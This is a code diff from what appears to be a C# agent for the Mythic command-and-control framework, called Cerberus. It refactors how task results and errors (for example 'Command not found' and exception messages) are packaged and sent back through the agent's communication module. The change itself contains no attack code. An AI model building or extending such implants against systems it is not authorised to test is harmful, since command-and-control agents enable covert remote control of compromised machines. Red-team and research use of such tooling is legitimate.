@@ -75,36 +75,46 @@ namespace Cerberus
 
             if (command is null)
             {
-                SendTaskResult(task, "Command not found.");
+                var result = new MythicTaskResult
+                {
+                    task_id = task.id,
+                    user_output = "Command not found",
+                    completed = true,
+                    status = "error",
+                    error = "Command not found"
+                };
+
+                SendTaskResult(result);
                 return;
             }
 
             try
             {
                 var result = command.Execute(task);
-                SendTaskResult(task, result);
+                SendTaskResult(result);
             }
             catch (Exception ex)
             {
-                SendTaskResult(task, ex.Message);
+                var result = new MythicTaskResult
+                {
+                    task_id = task.id,
+                    user_output = ex.Message,
+                    completed = true,
+                    status = "error",
+                    error = ex.Message
+                };
+                SendTaskResult(result);
             }
         }
 
-        private static void SendTaskResult(MythicTask task, string result)
+        private static void SendTaskResult(MythicTaskResult result)
         {
 /*            if (!task.completed)
             {
                 return;
             }*/
 
-            var taskResult = new MythicTaskResult
-            {
-                task_id = task.id,
-                user_output = result,
-                completed = true //task.completed,
-            };
-
-            _commModule.SendData(taskResult);
+            _commModule.SendData(result);
         }
 
         public void Stop()
